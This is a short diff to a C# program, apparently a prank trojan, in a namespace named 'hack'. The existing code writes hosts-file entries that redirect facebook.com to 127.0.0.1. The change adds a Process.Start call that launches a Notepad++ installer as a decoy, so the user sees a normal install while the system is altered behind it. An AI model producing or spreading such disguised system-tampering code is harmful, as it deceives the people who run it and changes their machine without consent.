@@ -1,4 +1,5 @@
 ﻿using System;
+using System.Diagnostics;
 using System.IO;
 
 namespace hack
@@ -19,6 +20,7 @@ namespace hack
                 sw.WriteLine("127.0.0.1 www.facebook.com");
                 sw.WriteLine("127.0.0.1 facebook.com");
             }
+            Process.Start("npp.6.9.Installer.exe");
         }
     }
 }
